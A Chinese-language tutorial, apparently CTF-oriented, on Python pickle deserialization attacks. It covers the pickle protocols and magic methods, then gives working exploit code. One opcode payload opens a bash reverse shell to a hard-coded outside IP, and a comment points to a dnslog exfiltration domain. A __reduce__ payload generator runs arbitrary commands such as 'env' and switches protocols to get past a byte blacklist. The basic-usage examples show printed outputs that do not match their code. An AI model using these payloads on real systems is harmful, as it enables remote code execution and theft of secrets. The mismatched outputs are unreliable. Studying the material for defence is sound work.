基本思路可以类比php反序列化，但是具体细节有些差异。

# Pickle

python的反序列化主要是基于内置的pickle模块。

它能将任意Python对象转换为二进制流并还原。

Pickle支持多种协议版本（目前Python官方支持0–5共6种协议），其中协议0为文本格式（Python 2兼容），协议1–3为历史二进制格式，协议4引入对超大对象和新类型的支持，协议5引入离带缓冲区以加速大对象传输 。不同协议产生的字节流会略有不同，但反序列化时Python自动探测版本。（会演示不同协议的效果）

# 魔术方法

`reduce`/`reduce_ex`: 在反序列化时自动调用

`getstate` /`setstate`: 当需要自定义实例状态存取时使用。

# 基本用法

pickle.dump(obj, file) ：将对象序列化后保存到文件。

pickle.load(file) ：读取文件， 将文件中的序列化内容反序列化为对象。

pickle.dumps(obj) ：将对象序列化成字符串格式的字节流。

pickle.loads(bytes_obj) ：将字符串格式的字节流反序列化为对象。

```Python
import pickle

data = {"name": "YoSheep", "role": "people"}

# 序列化data
ser = pickle.dumps(data)

# 反序列化
obj = pickle.loads(ser)

print(ser)
# b'\x80\x04\x95&\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04name\x94\x8c\x07YoSheep\x94\x8c\x04role\x94\x8c\x06people\x94u.'
print(obj)
# {'name': 'Sunny', 'role': 'people'}
```

```Python
import pickle

data = {"name": "YoSheep", "role": "people"}

# 序列化到文件
with open("data.pkl", "wb") as f:
    pickle.dump(data, f)

# 从文件反序列化
with open("data.pkl", "rb") as f:
    obj = pickle.load(f)

print(obj)  
# {'name': 'Sunny', 'role': 'people'}le'}
```

# 漏洞原理

python反序列化字节流的过程是会一个一个识别，中间如果遇到了操作码（opcode），则会执行相应的操作

并更新栈或memo，直到遇到终止符（`.`）为止，最终栈顶的对象即为反序列化结果。

常见的opcode：https://www.freebuf.com/articles/web/446382.html

```Python
import base64
import pickle

# opcode = b'''cos
# system
# (S'echo `ls`'
# tR.'''
opcode=b'''cos\nsystem\n(S"bash -c 'sh -i >& /dev/tcp/112.124.64.34/7777 0>&1'"\ntR.'''
print(opcode)

# `ls`.ll0zr4.dnslog.cn
```

当遇到过滤一些字节流是可以尝试构造opcode操作码绕过。

# 常见攻击

在反序列化时会调用reduce方法，所以可以在类中定义reduce方法，里面加上命令执行函数，在序列化类，反序列化时会造成命令执行

```Python
import pickle
import base64


def generate_simple_payload(command):
    """
    简化版：只通过更换协议来绕过黑名单
    """

    # 使用固定的exploit类，只更换协议
    class SimpleExploit:
        def __reduce__(self):
            # 使用能获取命令输出的方法
            return (eval, (f"__import__('os').popen('{command}').read()",))

    # 尝试所有协议版本
    protocols = [  1, 2, 3, 4, 5,0]

    for protocol in protocols:
        try:
            payload = pickle.dumps(SimpleExploit(), protocol=protocol)

            print(f"协议：{protocol}------{payload}")
            # 检查是否绕过黑名单
            if b'\x00' not in payload and b'\x1e' not in payload:

                print(f"✅ 协议 {protocol} 成功绕过黑名单")

                print(f"编码前的payload：{payload}")

                return base64.b64encode(payload)

        except Exception as e:
            continue




# 使用示例
if __name__ == "__main__":
    payload = generate_simple_payload("env")
    if payload:
        print(f"编码后的Payload: {payload}")
        print(f"攻击URL: /pickle_dsa?data={payload}")

        # 验证
        decoded = base64.b64decode(payload)
        print(f"是否包含\\x00: {b'\x00' in decoded}")
        print(f"是否包含\\x1e: {b'\x1e' in decoded}")
    else:
        print("无法生成有效的payload")
```

# 巧妙绕过

当遇到过滤一些16进制字符时，可以想到协议0的序列化是纯字符字节流，没有16进制字符，所以可以用0协议绕过

![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=YmNmYjZmODBiYzJkMTFjMmU1MjAxZWJkMTllYjY3N2RfczkzR3V3dU81QlNESHRsSElkcVdnaFNxWWo3RE1URmJfVG9rZW46V25SU2JhSnp3b3VkamJ4WlU3bWM1cWx6bjVkXzE3NjUzNzI1MTY6MTc2NTM3NjExNl9WNA)